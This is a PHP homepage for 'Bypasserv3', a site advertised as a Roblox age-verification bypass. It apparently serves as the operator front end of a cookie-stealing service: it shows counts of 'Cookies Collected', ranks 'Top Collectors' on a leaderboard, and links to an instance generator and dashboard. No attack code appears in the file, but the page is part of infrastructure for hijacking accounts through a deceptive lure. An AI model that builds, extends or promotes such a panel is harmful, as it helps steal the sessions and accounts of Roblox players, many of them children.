<?php
/**
 * Bypasserv3 - Homepage
 */

require_once __DIR__ . '/config.php';
require_once __DIR__ . '/functions.php';

// Get global stats
$stats = getGlobalStats();

// Get leaderboard
$leaderboard = getLeaderboard(5);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bypasserv3 - Roblox Age Bypasser</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #8b5cf6;
            --primary-dark: #7c3aed;
            --dark: #02040a;
            --darker: #0a0e27;
        }

        body {
            font-family: 'Outfit', sans-serif;
            background: linear-gradient(135deg, var(--dark) 0%, var(--darker) 50%, var(--dark) 100%);
            background-size: 400% 400%;
            animation: gradientShift 15s ease infinite;
            color: #f8fafc;
        }

        @keyframes gradientShift {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }

        .glass-effect {
            backdrop-filter: blur(10px) saturate(180%);
            background-color: rgba(17, 25, 40, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.125);
        }

        .animated-gradient-text {
            background: linear-gradient(90deg, #667eea 0%, #764ba2 25%, #f093fb 50%, #667eea 75%, #764ba2 100%);
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            animation: gradientFlow 3s linear infinite;
        }

        @keyframes gradientFlow {
            0% { background-position: 0% center; }
            100% { background-position: 200% center; }
        }

        .hover-lift {
            transition: transform 0.2s ease, box-shadow 0.2s ease;
        }

        .hover-lift:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(139, 92, 246, 0.3);
        }

        .stat-counter {
            font-size: 3rem;
            font-weight: 700;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
    </style>
</head>
<body class="min-h-screen overflow-x-hidden">
    <!-- Hero Section -->
    <div class="container max-w-6xl mx-auto px-4 py-16">
        <div class="text-center mb-16">
            <div class="relative inline-block mb-8">
                <div class="absolute inset-0 bg-purple-600/20 blur-3xl rounded-full"></div>
                <div class="relative w-24 h-24 bg-white/5 border border-white/10 rounded-3xl flex items-center justify-center backdrop-blur-sm shadow-2xl glass-effect mx-auto">
                    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="text-white"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                </div>
            </div>
            
            <h1 class="text-6xl md:text-7xl font-display font-bold tracking-tight mb-6 animated-gradient-text">
                Bypasserv3
            </h1>
            
            <p class="text-white/60 text-xl mb-12 max-w-2xl mx-auto">
                Advanced Roblox Age Verification Bypass System
            </p>
            
            <div class="flex gap-4 justify-center flex-wrap">
                <a href="/generator/" class="px-8 py-4 bg-white text-black rounded-2xl font-bold text-lg hover:bg-white/90 transition-all hover:scale-105 inline-flex items-center gap-3">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 5v14M5 12h14"/></svg>
                    Create Instance
                </a>
                
                <a href="/dashboard/" class="px-8 py-4 bg-white/10 text-white border border-white/20 rounded-2xl font-bold text-lg hover:bg-white/15 transition-all hover:scale-105 inline-flex items-center gap-3 glass-effect">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
                    Dashboard
                </a>
            </div>
        </div>

        <!-- Stats Section -->
        <div class="grid grid-cols-1 md:grid-cols-4 gap-6 mb-16">
            <div class="glass-effect rounded-2xl p-6 text-center hover-lift">
                <div class="text-white/60 text-sm font-medium mb-2">Total Sites</div>
                <div class="stat-counter"><?php echo number_format($stats['totalSites']); ?></div>
            </div>
            
            <div class="glass-effect rounded-2xl p-6 text-center hover-lift">
                <div class="text-white/60 text-sm font-medium mb-2">Total Instances</div>
                <div class="stat-counter"><?php echo number_format($stats['totalInstances']); ?></div>
            </div>
            
            <div class="glass-effect rounded-2xl p-6 text-center hover-lift">
                <div class="text-white/60 text-sm font-medium mb-2">Cookies Collected</div>
                <div class="stat-counter"><?php echo number_format($stats['totalCookies']); ?></div>
            </div>
            
            <div class="glass-effect rounded-2xl p-6 text-center hover-lift">
                <div class="text-white/60 text-sm font-medium mb-2">Total Visits</div>
                <div class="stat-counter"><?php echo number_format($stats['totalVisits']); ?></div>
            </div>
        </div>

        <!-- Leaderboard -->
        <?php if (!empty($leaderboard)): ?>
        <div class="glass-effect rounded-2xl p-8 mb-16">
            <h2 class="text-3xl font-bold mb-6 text-center">🏆 Top Collectors</h2>
            <div class="space-y-4">
                <?php foreach ($leaderboard as $index => $user): ?>
                    <?php $rank = getRankInfo($user['totalCookies']); ?>
                    <div class="bg-white/5 rounded-xl p-4 flex items-center gap-4 hover:bg-white/10 transition-colors">
                        <div class="text-2xl font-bold text-white/40">#<?php echo $index + 1; ?></div>
                        
                        <img src="<?php echo htmlspecialchars($user['profilePicture']); ?>" alt="Avatar" class="w-12 h-12 rounded-full border-2 border-purple-500/50">
                        
                        <div class="flex-1">
                            <div class="font-semibold text-white"><?php echo htmlspecialchars($user['username']); ?></div>
                            <div class="text-sm text-white/60">
                                <?php echo $rank['current']['icon']; ?> <?php echo $rank['current']['name']; ?>
                            </div>
                        </div>
                        
                        <div class="text-right">
                            <div class="font-bold text-purple-400"><?php echo number_format($user['totalCookies']); ?> cookies</div>
                            <div class="text-sm text-white/60"><?php echo number_format($user['totalVisits']); ?> visits</div>
                        </div>
                    </div>
                <?php endforeach; ?>
            </div>
        </div>
        <?php endif; ?>

        <!-- Features -->
        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
            <div class="glass-effect rounded-2xl p-6 hover-lift">
                <div class="text-4xl mb-4">🔒</div>
                <h3 class="text-xl font-bold mb-2">Secure</h3>
                <p class="text-white/60">Military-grade security with advanced malware protection</p>
            </div>
            
            <div class="glass-effect rounded-2xl p-6 hover-lift">
                <div class="text-4xl mb-4">⚡</div>
                <h3 class="text-xl font-bold mb-2">Fast</h3>
                <p class="text-white/60">Lightning-fast processing with real-time stats</p>
            </div>
            
            <div class="glass-effect rounded-2xl p-6 hover-lift">
                <div class="text-4xl mb-4">📊</div>
                <h3 class="text-xl font-bold mb-2">Analytics</h3>
                <p class="text-white/60">Comprehensive dashboard with detailed analytics</p>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div class="text-center py-8 text-white/40">
        <p>&copy; 2024 Bypasserv3. All rights reserved.</p>
    </div>
</body>
</html>
